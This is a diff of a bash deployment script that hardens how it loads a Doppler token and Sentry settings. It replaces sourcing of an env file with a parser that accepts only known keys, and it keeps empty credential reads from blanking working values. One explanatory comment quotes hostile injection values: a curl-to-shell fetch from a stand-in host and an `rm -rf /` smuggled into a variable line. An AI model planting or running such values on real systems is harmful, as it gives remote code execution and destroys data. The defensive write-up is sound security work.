@@ -28,31 +28,42 @@ readonly LOG_TAG="ci-deploy"
 
 # --- #7095: pick up the re-deliverable Doppler credential -----------------------------
 # webhook.service's EnvironmentFile is /etc/default/webhook-deploy, whose DOPPLER_TOKEN was
-# revoked 2026-07-30T11:19:30.614Z with no re-delivery path (written once at first boot from
-# var.doppler_token; no Terraform resource, no replace_triggered_by, no drift detector). This
-# sources the re-deliverable sibling, so the value this deploy actually runs on can be refreshed
-# by a terraform apply. Later-wins: it overrides what the unit exported.
+# revoked 2026-07-30T11:19:30.614Z with no re-delivery path. This reads the re-deliverable
+# sibling so the value this deploy runs on can be refreshed by a terraform apply. Later-wins:
+# it overrides what the unit exported.
 #
-# WHY HERE AND NOT IN THE UNIT, OR IN ci-deploy-wrapper.sh:
-#   - Not webhook.service: the remediation apply would then have to restart the webhook to take
-#     effect, and the webhook IS the channel delivering the remediation, on a host with no
-#     operator SSH runbook and no orderable replacement. A unit that fails to start after that
-#     restart is unrecoverable. Leaving the unit untouched means the worst case is a failed
-#     deploy with the remediation channel still alive.
-#   - Not the wrapper: it is inert by construction — exactly one non-comment line, asserted by
-#     ci-deploy-wrapper.test.sh — so it can never become a hang surface AHEAD of `timeout`.
-#     Sourcing here instead puts the read UNDER the 4800s wall-clock cap, which is strictly
-#     safer than doing it before `timeout` is even applied.
+# PARSED, NOT SOURCED — and that is a security property, not a style choice.
+# `. /etc/default/soleur-doppler-token` would hand the file to the BASH parser, which performs
+# command substitution: a line `SENTRY_PROJECT_ID=$(curl -s http://x|sh)` executes as the
+# `deploy` user, which holds NOPASSWD sudo on infra-config-install and inngest-bootstrap.sh —
+# root on a host with no replacement path. An earlier revision of this block DID source it, with
+# a comment claiming the installer's `envfile_shape` check made that safe. It does not: that
+# check validates for systemd EnvironmentFile parseability, a DIFFERENT grammar. Measured — it
+# ACCEPTS `SENTRY_PROJECT_ID=$(echo PWNED)` and `DOPPLER_TOKEN=dp.st.X; rm -rf /`, and bash then
+# runs both. Three of the four values here are interpolated from var.sentry_dsn, whose regex
+# capture classes admit `$`, `(`, `)` and backtick.
 #
-# `[ -r ]`-guarded, written as an `if` rather than `[ -r … ] && . …`: the latter is a bare
+# The loop below assigns only the four keys it recognises and never evaluates the value, so a
+# hostile or malformed line is inert data rather than code. This removes the class; the
+# defence-in-depth layers (the terraform plan validation on var.doppler_token and var.sentry_dsn,
+# and the installer's shape rejection) remain, but nothing here depends on them being complete.
+#
+# `[ -r ]`-guarded and written as an `if` rather than `[ -r … ] && …`: the latter is a bare
 # trailing command whose exit status is 1 when the file is absent, which under this script's
-# `set -e` would abort the deploy outright. The `if` form is status-neutral, so a host that has
-# not yet received the file simply keeps its current behaviour. The file's shape is enforced
-# before it ever lands (terraform plan validation on var.doppler_token, the installer's
-# envfile_shape rejection), so a malformed value cannot reach this source.
-# shellcheck disable=SC1091  # host-side file, absent at lint time
+# `set -e` would abort the deploy outright rather than no-op.
 if [ -r /etc/default/soleur-doppler-token ]; then
-  . /etc/default/soleur-doppler-token
+  while IFS='=' read -r _cred_k _cred_v; do
+    case "$_cred_k" in
+      DOPPLER_TOKEN|SENTRY_INGEST_DOMAIN|SENTRY_PROJECT_ID|SENTRY_PUBLIC_KEY)
+        # Skip an empty value rather than blanking a working one. `EnvironmentFile=-` tolerates
+        # ABSENT and UNREADABLE but NOT empty-valued, and the installer's shape check accepts a
+        # bare `KEY=` (measured), so this is the layer that actually holds that line.
+        [ -n "$_cred_v" ] && printf -v "$_cred_k" '%s' "$_cred_v"
+        ;;
+    esac
+  done < /etc/default/soleur-doppler-token
+  export DOPPLER_TOKEN SENTRY_INGEST_DOMAIN SENTRY_PROJECT_ID SENTRY_PUBLIC_KEY
+  unset _cred_k _cred_v
 fi
 
 # Image signature verification (#5933 Item 4; #6005 private-GHCR + offline rework).
@@ -1165,7 +1176,7 @@ _cred_err_tail() {
   _e="$(printf '%s' "${1:-}" \
     | LC_ALL=C tr -c '[:print:]' ' ' \
     | LC_ALL=C tr '"' "'" \
-    | sed -E 's/dp\.st\.[A-Za-z0-9._-]*/dp.st.REDACTED/g')"
+    | sed -E 's/dp\.[a-z]{2,}\.[A-Za-z0-9._-]*/dp.REDACTED/g')"
   # Bash does NOT clamp a negative substring offset: `${_e: -200}` on a 12-byte string yields the
   # EMPTY string, not the whole string (the same trap `_login_hatch` documents and that
   # ci-deploy.test.sh pins). Hence the explicit length test rather than the idiomatic one-liner.
@@ -1417,12 +1428,30 @@ ghcr_prelude_and_login() {
     unset GHCR_READ_TOKEN   # keep the token out of THIS process env + its children
   fi
   if command -v doppler >/dev/null 2>&1 && [[ -n "${DOPPLER_TOKEN:-}" ]]; then
-    # SENTRY_* prefetch for the verify/pull telemetry curls (dark event if absent, as today).
+    # SENTRY_* refresh for the verify/pull telemetry curls.
+    #
+    # #7095 — PREFER THE BAKED VALUE; NEVER OVERWRITE IT WITH AN EMPTY READ. This loop used to be
+    # `printf -v "$k" '%s' "$(doppler … 2>/dev/null || true)"`, which is an UNCONDITIONAL
+    # assignment: on a revoked token the read yields "" and `printf -v` writes that empty string
+    # over the value sourced from /etc/default/soleur-doppler-token at the top of this script
+    # (verified: `X=preset; printf -v X %s "$(false || true)"` leaves X empty — bash does not skip
+    # the assignment). Because ghcr_prelude_and_login runs BEFORE zot_gate_and_login and before
+    # every pull/verify emitter, that blanked all seven `[[ -n $SENTRY_INGEST_DOMAIN && … ]]`
+    # guards and took the host Sentry-dark — silently destroying, ~1400 lines later, the exact
+    # mitigation the baking exists to provide. It is why 341 unit failures over 5.7h paged nobody.
+    #
+    # Now: read through the instrument, and assign ONLY on a non-empty result. A failed read is
+    # reported (SOLEUR_DEPLOY_CRED_FAIL) and leaves the baked value standing. `2 2 0` = 2 attempts,
+    # 2s apart, no empty-retry — an rc=0 empty read is the server answering cleanly with nothing,
+    # which a retry cannot fix, and these three have a baked fallback so there is nothing to wait for.
     for k in SENTRY_INGEST_DOMAIN SENTRY_PROJECT_ID SENTRY_PUBLIC_KEY; do
       # `secrets get <NAME> --plain` returns the bare value on stdout (never argv).
-      printf -v "$k" '%s' "$(doppler secrets get "$k" --plain --project soleur --config prd 2>/dev/null || true)"
+      _sentry_v=""
+      _doppler_get_or_report "$k" _sentry_v 2 2 0 || true
+      [[ -n "$_sentry_v" ]] && printf -v "$k" '%s' "$_sentry_v"
       export "$k"
     done
+    unset _sentry_v
     # Hardened Doppler fallback for any GHCR cred the bake did not supply.
     # #7095: the hand-rolled `until` loops here were `2>/dev/null` — 3 attempts, and if all three
     # came back empty the function simply carried on with an empty string and let the "not both
@@ -1552,6 +1581,12 @@ zot_gate_and_login() {
       # but it now says why. The terminal `doppler_read_failed` reason is a separate, later PR.
       ZOT_GATE_STATUS="cred_read_failed"
       logger -t "$LOG_TAG" "ZOT_GATE: doppler read FAILED rc=${CRED_RC} empty=${CRED_EMPTY} — the host cannot read its own credential source (NOT pre-provisioning)"
+      # #7095 — SECOND, CREDENTIAL-INDEPENDENT TRANSPORT. journald→Vector→Better Stack is not
+      # enough on its own here: vector.service runs `doppler run -- vector` off the SAME token and
+      # survives only because it started before the revocation, so any restart takes this marker's
+      # sole route off the box with it. The Sentry emit uses the BAKED DSN components, which now
+      # survive a dead token (see ghcr_prelude_and_login), giving two independent vendors again.
+      zot_gate_degraded_event cred_read_failed
       return 0
     fi
   fi
